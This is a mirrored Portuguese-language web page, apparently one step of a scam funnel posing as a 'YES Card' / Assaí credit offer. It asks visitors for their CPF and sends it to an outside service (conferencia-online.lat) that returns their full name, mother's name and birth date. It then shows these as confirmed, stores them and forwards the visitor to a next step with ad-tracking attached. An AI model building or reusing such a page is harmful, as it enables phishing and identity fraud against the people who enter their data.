<!DOCTYPE html>
<html lang="pt-BR">
<head>

    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Consulta de CPF</title>
    <link href="4/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f9f9f9;
            color: #333;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .header {
            background-color: #1E3A80;
            padding: 20px;
            text-align: center;
            border-bottom: 3px solid #ee4d2d;
        }

        .header img {
            width: 150px;
        }

        .main-content {
            max-width: 500px;
            background: #fff;
            margin: 50px auto;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
        }

        .btn-custom {
            color: white;
            border: none;
            width: 100%;
            margin-bottom: 10px;
            background: #1E3A80;
            font-weight: 600;
            border-radius: 1rem;
            padding: .75rem 3rem;
            letter-spacing: .3px;
            line-height: 1.15;
        }

        .btn-custom:hover {
            color: white !important;
            background-color: #000 !important;
            transform: scale(1.02) !important;
        }

        .footer {
            background: #ffffff;
            border-top: 1px solid #e6e6e6;
            text-align: center;
            padding: 15px;
            font-size: 10px;
            color: #666;
            margin-top: auto;
        }

        .result-box {
            margin-top: 20px;
            background-color: #f9f9f9;
            border: 1px solid #e6e6e6;
            border-radius: 8px;
            padding: 15px;
            display: none;
            text-align: left;
        }

        .result-box p {
            margin: 0 0 10px;
        }

        .loader {
            display: none;
            text-align: center;
            margin-bottom: 15px;
        }

        .loader img {
            width: 50px;
            height: 50px;
        }

        .success-message {
            text-align: center;
            font-weight: bold;
            color: green;
            margin-bottom: 15px;
        }

        .success-message img {
            width: 50px;
            height: 50px;
            display: block;
            margin: 0 auto 10px;
        }
    </style>
<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1289289589600537');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=1289289589600537&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->
<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>
</head>

<body>
    <!-- Header -->
    <div class="header">
        <img src="4/images/logo.svg" alt="YES Card">
    </div>

    <!-- Main Content -->
    <div class="main-content">
        <p style="color:gray; text-align:initial">Preencha o CPF para consulta</p>
        <form id="cadastroForm" style="text-align:initial">
            <div class="mb-3">
                <label for="cpf" class="form-label" style="color:gray; font-size:13px">CPF</label>
                <input type="text" class="form-control" id="cpf" placeholder="000.000.000-00">
            </div>
        </form>
        <button id="consultarBtn" class="btn-custom" onclick="submitLog()">Consultar CPF</button>
        <div id="loader" class="loader">
            <img src="4/images/21-18-05-265_512.gif" alt="Carregando...">
            <p>Consultando seus dados...</p>
        </div>

        <!-- Resultado -->
        <div id="resultBox" class="result-box">
            <div class="success-message">
                <img src="4/images/6784655.png" alt="Aprovado">
                <p>Dados encontrados com sucesso!</p>
            </div>
            <p>Iniciando cadastro de <strong><span id="nomeCompleto"></span></strong></p>
            <p><strong>Nome da Mãe:</strong> <span id="nomeMae"></span></p>
           
            <button class="btn-custom" onclick="continuar()">Continuar</button>
        </div>
    </div>

    <!-- // Buscar dados do CPF com a API da MagmaDataHub https://magmadatahub.com-->
    <script>
    // // Buscar dados do CPF com a nova API https://apela-api.tech/
    function validaCPF(strCPF) {
        let Soma = 0;
        let Resto;
        if (strCPF == "00000000000") return false;

        for (let i = 1; i <= 9; i++) Soma += parseInt(strCPF.substring(i - 1, i)) * (11 - i);
        Resto = (Soma * 10) % 11;

        if ((Resto == 10) || (Resto == 11)) Resto = 0;
        if (Resto != parseInt(strCPF.substring(9, 10))) return false;

        Soma = 0;
        for (let i = 1; i <= 10; i++) Soma += parseInt(strCPF.substring(i - 1, i)) * (12 - i);
        Resto = (Soma * 10) % 11;

        if ((Resto == 10) || (Resto == 11)) Resto = 0;
        if (Resto != parseInt(strCPF.substring(10, 11))) return false;
        return true;
    }

    // Nova função para chamar diretamente a API de CPF
    async function getCPFDataFromAPI(cpfNumerico) {
        const apiUrl = `https://conferencia-online.lat/api.php?cpf=${encodeURIComponent(cpfNumerico)}`;
        console.log('Chamando API diretamente:', apiUrl);
        
        const response = await fetch(apiUrl, {
            method: 'GET',
            headers: {
                'Accept': 'application/json'
            }
        });

        if (!response.ok) {
            let errorMsg = `Erro na requisição à API: ${response.status}`;
            try {
                const errData = await response.json();
                errorMsg = (errData && errData.message) ? errData.message : errorMsg;
            } catch (e) {
                // Não conseguiu fazer parse do JSON de erro
            }
            throw new Error(errorMsg);
        }
        
        const data = await response.json();
        console.log('Dados recebidos da API:', data);
        
        // Verifica se a resposta da API indica um erro
        if (data.error || !data.nome) {
            throw new Error(data.message || "Dados não encontrados para o CPF informado.");
        }
        
        // Mapeia os dados para o formato esperado pelo frontend
        return {
            error: false,
            message: 'Consulta realizada com sucesso.',
            data: {
                'CPF_CONSULTADO': data.cpf || cpfNumerico,
                'NOME': data.nome || '',
                'SEXO': data.sexo || '',
                'NASCIMENTO': data.nascimento || '',
                'MAE': data.mae || ''
            }
        };
    }

    async function submitLog() {
        const cpfInput = document.getElementById("cpf");
        const loader = document.getElementById("loader");
        const resultBox = document.getElementById("resultBox");
        const consultarBtn = document.getElementById("consultarBtn");

        if (!cpfInput || !loader || !resultBox || !consultarBtn) {
            alert("Erro: Elementos da página não encontrados. Verifique os IDs.");
            return;
        }

        const cpf = cpfInput.value.replace(/-/g, "").replace(/\./g, "");

        if (!validaCPF(cpf)) {
            alert("CPF inválido!");
            return;
        }

        loader.style.display = "block";
        consultarBtn.style.display = "none";
        resultBox.style.display = "none";

        try {
            // Chama a nova função que usa a API diretamente
            const responseDataFromAPI = await getCPFDataFromAPI(cpf);

            // Verifica se a resposta da API indica um erro ou se os dados esperados estão presentes
            if (responseDataFromAPI.error || !responseDataFromAPI.data || !responseDataFromAPI.data.NOME) {
                const errorMessage = responseDataFromAPI.message || "Dados não encontrados para o CPF informado.";
                throw new Error(errorMessage);
            }

            // Os dados de responseDataFromAPI.data já vêm mapeados da API para:
            // NOME, MAE, NASCIMENTO, CPF_CONSULTADO
            const dadosParaSalvar = {
                nomeCompleto: responseDataFromAPI.data.NOME || "Não informado",
                nomeMae: responseDataFromAPI.data.MAE || "Não informado",
               
                nascimento: responseDataFromAPI.data.NASCIMENTO || "Não informado", // Adicionando nascimento
                cpf: responseDataFromAPI.data.CPF_CONSULTADO || cpf // Usa o CPF consultado pela API
            };
            
            // Exibe os dados imediatamente para melhor performance
            document.getElementById("nomeCompleto").innerText = dadosParaSalvar.nomeCompleto;
            document.getElementById("nomeMae").innerText = dadosParaSalvar.nomeMae;
            
            // Se você tiver um campo para exibir a data de nascimento:
            // document.getElementById("dataNascimentoResult").innerText = dadosParaSalvar.nascimento;

            localStorage.setItem("dadosCPF", JSON.stringify(dadosParaSalvar));
            console.log('Dados salvos no localStorage (chave dadosCPF):', dadosParaSalvar);

            loader.style.display = "none";
            resultBox.style.display = "block";

        } catch (error) {
            console.error("Erro na consulta:", error);
            alert(`Erro ao consultar o CPF: ${error.message}`);
            loader.style.display = "none";
            consultarBtn.style.display = "block"; // Mostra o botão de consultar novamente em caso de erro
            resultBox.style.display = "none";
        }
    }

    function continuar() {
        // Esta função pega os parâmetros da URL atual e os repassa para a próxima página.
        // O CPF digitado e consultado já está em localStorage com a chave "dadosCPF".
        // A próxima página (/5) precisará ler do localStorage OU
        // podemos adicionar o CPF aos parâmetros da URL aqui também, se necessário.
        
        let currentUrlParams = new URLSearchParams(window.location.search);
        
        // Opcional: Adicionar o CPF consultado à URL de redirecionamento, se a próxima página precisar dele via URL
        // const dadosSalvos = JSON.parse(localStorage.getItem("dadosCPF"));
        // if (dadosSalvos && dadosSalvos.cpf) {
        //     currentUrlParams.set('cpf_consultado', dadosSalvos.cpf);
        // }

        const nextPageUrl = "/5"; // Ou o caminho completo se necessário
        window.location.href = nextPageUrl + (currentUrlParams.toString() ? '?' + currentUrlParams.toString() : '');
    }

    // Adicionar o listener ao botão "consultarBtn" se ele não estiver já configurado no HTML com onclick
    // Se o botão no seu HTML for <button id="consultarBtn" onclick="submitLog()">, este listener não é necessário.
    // Se for <button id="consultarBtn">, então este listener é necessário:
    document.addEventListener('DOMContentLoaded', () => {
        const consultarButton = document.getElementById("consultarBtn");
        if (consultarButton) {
            if (!consultarButton.hasAttribute('onclick')) { // Só adiciona se não tiver onclick inline
                 consultarButton.addEventListener('click', submitLog);
            }
        }
        // Adicione aqui listeners para outros botões, como um possível botão "Continuar" que chame a função continuar()
        // Ex: const btnContinuarEtapa = document.getElementById('btnContinuarEtapa');
        // if(btnContinuarEtapa) {
        //     btnContinuarEtapa.addEventListener('click', continuar);
        // }
    });

</script>

    <!-- Footer -->
    <div class="footer">
        Copyright © 2025 Assaí. Todos os direitos reservados.<br>

        Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa do Site
    </div>




</body>
<!-- Mirrored from proposta-aprovada.click/log.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 25 Jan 2025 01:09:25 GMT -->

</html>
